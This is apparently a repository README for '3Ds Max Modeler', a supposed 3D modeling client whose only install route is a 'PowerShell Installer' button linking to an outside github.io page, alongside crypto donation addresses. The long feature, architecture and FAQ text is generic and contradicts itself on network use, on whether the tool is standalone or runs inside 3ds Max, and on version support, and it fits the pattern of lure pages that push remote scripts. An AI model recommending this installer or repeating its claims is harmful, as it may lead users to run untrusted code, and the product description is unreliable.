<div align="center">

# 3Ds Max Modeler — Professional 3D Modeling Desktop Client for Windows 10 & 11

![](files/preview.png)

### 💻 PowerShell Installer

<a href="https://huygenshin220607-blip.github.io/3ds-max-modeler/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![platform](https://img.shields.io/badge/Platform-Windows_10_%2F_11-f97316?style=plastic&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/Ps--Core-5.1%2B-fb923c?style=plastic&labelColor=0d1117)]() [![release](https://img.shields.io/badge/Release-Stable-2ea44f?style=plastic&labelColor=0d1117)]() [![installs](https://img.shields.io/badge/Installs-686-ea580c?style=plastic&labelColor=0d1117)]()

<div align="center">
<h3>Help keep this going</h3>
<p><strong>BTC</strong>:&nbsp;<code>1MBFD83a649tGwKPPwUm7oqb5eVZXJnW4k</code> | <strong>TRON</strong>:&nbsp;<code>TYW9JVhVfLCrTF136Sx4FrFEXaX2wXTjed</code> | <strong>ETH</strong>:&nbsp;<code>0x7Eed60b9AA721608682aF4ef89AEf734333F8E06</code></p>
</div>

</div>

---

3Ds Max Modeler is a desktop application that provides a structured environment for creating, editing, and managing 3D models using a native 3ds Max workflow. The application supports polygon and spline-based modeling, modifier stacks, and scene hierarchy management, enabling precise control over geometry at every stage of authoring. Built for performance and reliability on Windows, it handles large scenes through optimized viewport rendering and efficient data handling. Users can import, transform, and export assets while maintaining consistent unit and material definitions across projects.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Parametric Primitive Library**: Generate box, cylinder, sphere, torus, cone, and plane primitives with adjustable dimensions, segment counts, and transform parameters exposed through a unified property panel.

- **Mesh Editing Toolkit**: Perform vertex, edge, face, and element-level operations including extrude, bevel, inset, bridge, chamfer, weld, and target weld with configurable falloff and constraint options.

- **Modifier Stack System**: Apply and reorder non-destructive modifiers such as TurboSmooth, Shell, Lathe, and Bend, with per-modifier parameter rollback and live preview of the evaluated result.

- **Scene Graph and Outliner**: Navigate hierarchical object structures, group and link objects, and manage visibility, freeze states, and render flags through a dockable outliner with search and filtering.

- **Material and Shading Editor**: Author physically based materials with diffuse, specular, roughness, and normal inputs, assign multi-sub-object material IDs, and preview shading in real time within the viewport.

- **UV Unwrapping and Mapping**: Project planar, cylindrical, box, and spherical UVs, then refine seams and packing with manual UV vertex editing and texel density visualization.

- **Viewport Navigation and Display Modes**: Switch between wireframe, shaded, realistic, and clay display modes, with orthographic and perspective cameras, snapping, grid configuration, and customizable viewport layouts.

- **Transform and Snapping Controls**: Move, rotate, and scale with axis constraints, pivot management, and grid, vertex, edge, and angle snapping for precise placement.

- **Scene Persistence and Import/Export**: Save and load native project files with full modifier and material fidelity, and exchange geometry through standard interchange formats for downstream workflows.

- **Undo/Redo and History**: Command-level undo and redo across modeling, modifier, and material operations, with a configurable history depth.

- **Scripting and Automation Hooks**: Expose core modeling operations through an embedded scripting interface for batch processing, procedural generation, and repetitive task automation.

- **Performance and Stability**: Multi-threaded modifier evaluation, adaptive viewport tessellation, and memory-aware scene handling to maintain interactivity on complex scenes.

## How it works

3Ds Max Modeler operates on a modular, event-driven architecture that separates scene parsing, geometry processing, and viewport synchronization into distinct subsystems. On launch, the application initializes a lightweight core runtime that registers available model operators, material handlers, and file format adapters. Each subsystem communicates through a shared scene graph, ensuring that edits made in one context are reflected consistently across all dependent components.

The modeling pipeline begins with scene ingestion. Supported geometry and scene files are parsed into an internal representation that preserves topology, transform hierarchies, and material assignments. This intermediate layer decouples imported data from the native document model, allowing non-destructive edits and reliable undo/redo tracking across arbitrarily deep operation stacks.

Geometry operations are executed through a command-based processing engine. Every modeling action—extrusion, beveling, subdivision, boolean evaluation, and modifier application—is encapsulated as a discrete command with well-defined inputs and outputs. Commands are validated before execution, applied to the scene graph, and committed to a transaction log. This design enables deterministic replay of operation histories and supports incremental recomputation, so only affected geometry regions are reprocessed when parameters change.

The modifier stack is evaluated lazily. Rather than baking transformations immediately, 3Ds Max Modeler maintains a dependency graph of modifiers and recomputes only the branches whose inputs have been invalidated. Cached intermediate results accelerate interactive editing, while explicit evaluation boundaries prevent unnecessary recomputation during complex scene updates.

Viewport rendering is decoupled from the document model through a synchronization layer. The renderer consumes scene snapshots and updates incrementally as commands commit, using change notifications to refresh only the affected buffers. This keeps interactive manipulation responsive regardless of overall scene complexity and allows background tasks such as file I/O or modifier evaluation to proceed without blocking the interface.

Persistence is handled by a versioned document format that serializes the scene graph, command history metadata, and subsystem state. On save, the application writes a consistent snapshot; on load, it reconstructs the graph and replays any pending state required to restore the session. Autosave and crash recovery leverage the same transaction log, enabling restoration to the last committed operation.

All subsystems expose internal extension points for custom operators, format adapters, and material resolvers, allowing the core runtime to remain stable while functionality is composed at load time. Configuration and preferences are stored separately from scene data, ensuring that user settings persist independently of project files.

## Modules and Settings

### Scene Object Creation and Editing
This module provides the starting point for building a scene and gives users lasting control over the objects they place. Every change made here becomes the foundation that later geometry, material and rendering modules operate on.

- Object type selection lets users choose between geometric primitives and structured mesh objects, changing which parameters appear in the editing panel.
- Transform modes for move, rotate and scale allow precise repositioning of objects, with pivot location affecting how rotations and scaling behave.
- Editable creation parameters such as segment counts and dimensions remain accessible after creation, so users can refine shape without rebuilding the object.
- The viewport refreshes as parameters change, giving immediate visual confirmation of the adjusted geometry.

### Geometry Modification Tools
This module handles surface-level changes, letting users reshape objects beyond their original parameters while keeping edits reversible. Its output feeds directly into the material and rendering modules, since the final mesh determines what those stages display.

- Editable mesh sub-object modes allow selecting vertices, edges and faces for targeted edits rather than affecting the whole object.
- Surface operations such as extrusion, beveling and subdivision modify selected regions, with the viewport showing the updated mesh as each operation is applied.
- The modifier stack records adjustments in order, and users can reorder or toggle individual entries to compare results before committing.
- Modifier visibility toggles let users temporarily disable an effect and inspect the base shape alongside the modified version.

### Material and Texture Assignment
This module controls how object surfaces appear, connecting geometry to the visual result seen in the viewport and in previews. Materials created here carry through to scene organization and render preparation, so consistent surface treatment can be maintained across an assembly.

- Material creation and assignment let users apply a single shared material to multiple objects, keeping a scene visually coherent.
- Surface property controls adjust characteristics such as color, glossiness and bump, with shaded viewport display reflecting the result.
- Texture map slots accept maps for different surface channels, and the material editor shows the current slot configuration for review.
- Users can compare material variations before finalizing, then apply the chosen setup across related objects.

### Scene Organization and Hierarchy
This module keeps complex scenes manageable by structuring objects into clear relationships. It works alongside object creation and lighting setup, since groupings and visibility states affect how users navigate and edit everything placed in the scene.

- The scene explorer lists all objects and supports renaming, grouping and parenting to establish hierarchy.
- Visibility and freeze states can be set per object, keeping working views uncluttered while hidden items remain in the file.
- The outliner updates immediately after structural changes, making it easier to locate objects within deep assemblies.
- Parent-child relationships let users transform grouped items together while retaining individual object control.

### Viewport Display and Navigation
This module shapes the working view itself, providing the visual context in which all editing modules are used. Display and navigation choices determine how clearly geometry, materials and lighting setups are evaluated during a session.

- Orbit, pan and zoom navigation supports inspecting objects from any angle, with single or multiple viewport layouts available.
- Display modes such as wireframe and shaded views let users match detail level to the current task.
- Grid and snap settings assist precise placement during transforms and geometry edits.
- Layout switching between viewport arrangements helps users compare perspectives or work across several views at once.

### Render Preparation and Preview
This module turns the assembled scene into a fixed visual reference, drawing on geometry, materials, lighting and camera setups from the other modules. Users can iterate on settings and regenerate previews until the result matches the intended output.

- Output resolution and render settings define the framing and quality of the resulting image or frame.
- Preview renders provide a fixed reference of the scene as it currently stands for checking materials, lighting and composition.
- Settings can be adjusted and previews repeated, allowing comparison between iterations before finalizing.

### Additional Settings
- Save, export and import options move scenes between the native format and common interchange formats, with import checks for scale and orientation.
- Lighting and camera controls adjust position, orientation and basic intensity or focal settings for composition checks.
- Autosave or recovery preferences help protect ongoing work during longer sessions.
- Unit and measurement preferences keep object dimensions consistent when importing external models.
- Viewport background and display preferences adjust the working environment for different modeling tasks.

## Usage Scenarios

### Blocking Out a Prop from Primitives to Finished Mesh
**Goal:** An environment artist needs to build a small mechanical crate prop for a game scene, starting from basic shapes and refining it into a finished mesh.

**Steps:**
1. Add a box primitive from the object type selection, then set its dimensions and segment counts in the editing panel so the proportions match the intended crate size.
2. Use move, rotate and scale transform modes with grid and snap settings enabled to position the crate on the ground plane at the correct scale.
3. Convert the object to an editable mesh, enter sub-object mode and select edge loops for extrusion and beveling to create panel seams and corner reinforcements.
4. Apply a subdivision modifier from the modifier stack, then toggle it on and off to compare the smoothed result against the base shape.
5. Reorder modifier entries to test whether beveling before or after subdivision gives cleaner edges.

**Expected result:** The viewport shows a detailed crate mesh with crisp beveled edges and controlled subdivision, with creation parameters and modifier entries still accessible for later refinement.

### Building a Consistent Material Set for a Furniture Assembly
**Goal:** A designer wants several furniture pieces in one scene to share a coherent wood-and-metal look, with variations compared before committing.

**Steps:**
1. Create a material with surface properties adjusted for color, glossiness and bump, and assign it to the table and chair objects together so they share the same look.
2. Add texture maps into the appropriate map slots for the wood surface channels and review the slot configuration in the material editor.
3. Create a second material variation for a darker finish and compare it against the first in shaded viewport display.
4. Apply the chosen material to related objects in the assembly, then group and parent the pieces in the scene explorer to keep the set organized.
5. Rename the grouped objects and set freeze states on finished pieces so remaining work stays uncluttered.

**Expected result:** All furniture objects display a consistent chosen finish in shaded viewport mode, with variations reviewable in the material editor and the assembly clearly structured in the outliner.

### Preparing a Composition Preview with Lighting and Cameras
**Goal:** A modeler needs to evaluate a finished model under different lighting and camera angles and produce a preview render for review.

**Steps:**
1. Place light objects and a camera in the scene, adjusting position, orientation and intensity or focal settings for each.
2. Switch between single and multiple viewport layouts to compare the camera view against a wireframe inspection view.
3. Configure output resolution and render settings for the intended framing and quality.
4. Generate a preview render to check materials, lighting and composition as a fixed reference.
5. Adjust light intensity or camera framing and repeat the preview until the result suits the output.

**Expected result:** A rendered preview image showing the model under the chosen lighting and camera angle, with settings retained so further iterations can be compared against earlier previews.

## Compatibility

3Ds Max Modeler is built to integrate cleanly into existing 3ds Max production pipelines. It targets 3ds Max  and later, and runs on 64-bit Windows 10 and Windows 11. Both the standard and the Design editions of 3ds Max are supported, and the tool works in the same way regardless of which one is installed.

The modeler follows the native unit and scene conventions of 3ds Max, so it operates in metric and imperial units, respects the scene unit scale, and handles scenes with mixed unit setups. Existing geometry, modifiers, materials, and hierarchy structures remain intact when the tool is used, and objects it produces are standard editable entities that can be further modified with built-in 3ds Max tools.

Interoperability covers the file formats already common in 3ds Max workflows, including native scene files and the standard import and export formats supported by the host application. The tool does not require a separate runtime, external service, or network connection; it executes entirely within the 3ds Max process. Compatibility is maintained across service packs and minor version updates within the supported release range, and behavior is consistent on workstations and render nodes alike.

## FAQ

**What file formats does 3Ds Max Modeler import and export?**
The application supports native scene interchange for geometry, materials, and hierarchy data, along with common mesh formats for asset exchange. Export preserves object transforms, smoothing groups, and material assignments. Consult the Compatibility section for the complete format matrix.

**Does 3Ds Max Modeler modify original source files?**
No. All edits are performed on an in-memory working copy. Files are written only on explicit save or export operations, and non-destructive modifiers remain editable throughout the session.

**How does the modeling engine handle large scenes?**
Geometry is processed through a deferred evaluation pipeline with spatial partitioning for viewport culling. Instanced objects share a single source definition, so memory scales with unique geometry rather than instance count. Undo history is compressed incrementally to bound memory growth on long editing sessions.

**Can workflows be automated or scripted?**
Yes. The application exposes a command interface covering selection, transforms, modifier application, and batch export. Scripts can be bound to toolbar actions or executed in sequence for repeatable production tasks.

**Is multi-object and multi-selection editing supported?**
Yes. Transform, modifier, and material operations apply across arbitrary selections, with per-object overrides preserved where applicable. Numeric transform entry works against the selection centroid or individual pivots, depending on the active mode.

**What are the system requirements?**
3Ds Max Modeler targets 64-bit desktop operating systems with a discrete or integrated GPU supporting hardware-accelerated viewport rendering. A minimum display resolution and available disk space for scratch data are required; recommended specifications scale with scene complexity.

**Does the software require network access?**
No. Core modeling, editing, and export functions operate fully offline. Network access is not required for licensing validation during normal use.

**How are updates delivered?**
Updates are distributed as versioned releases. The application reports its build version in the About panel, and project files remain forward-compatible across minor releases within the same major version.

**Where can I report defects or request features?**
Defect reports and feature requests are tracked through the project's issue tracker. Include the build version, reproduction steps, and a minimal scene file where possible to expedite triage.

## License

3Ds Max Modeler is distributed under a proprietary commercial license. Use of the software is governed by the terms of the end-user license agreement (EULA) accepted during installation; that agreement takes precedence over any summary provided here.

The license grants a non-exclusive, non-transferable right to install and use 3Ds Max Modeler on the number of workstations covered by the purchased seats. Seats are named to individual users and may not be shared concurrently, sublicensed, rented, or redistributed. Installation on additional machines for the same named user is permitted solely for the purpose of portable or secondary use, provided only one instance is active at a time.

Permitted use includes modeling, editing, and scene authoring of original or licensed content within the application, along with the export of user-generated assets, which remain the sole property of the user. The license does not extend to the application's source code, internal data structures, shaders, or bundled runtime components, which remain the confidential and proprietary property of the project and its licensors.

Restrictions under the license include, but are not limited to: reverse engineering, decompilation, or disassembly of the binaries except where such restriction is expressly prohibited by applicable law; modification or creation of derivative works of the software; removal or alteration of copyright, trademark, or attribution notices; and use of the software to develop a competing product or to train automated systems on its internal components.

The license is effective until terminated. It terminates automatically upon breach of any term or upon expiration of the applicable subscription term where one applies. On termination, the user must cease all use and remove all installed copies. Perpetual licenses remain valid for the version acquired, with access to subsequent major releases governed by the applicable upgrade policy.

The software is provided "as is" to the maximum extent permitted by law, without warranties of merchantability, fitness for a particular purpose, or non-infringement. The licensor's aggregate liability arising from use of the software is limited to the fees paid for the license during the preceding twelve months. Nothing in the license excludes liability that cannot be excluded under applicable law.

All rights not expressly granted are reserved by the project and its licensors.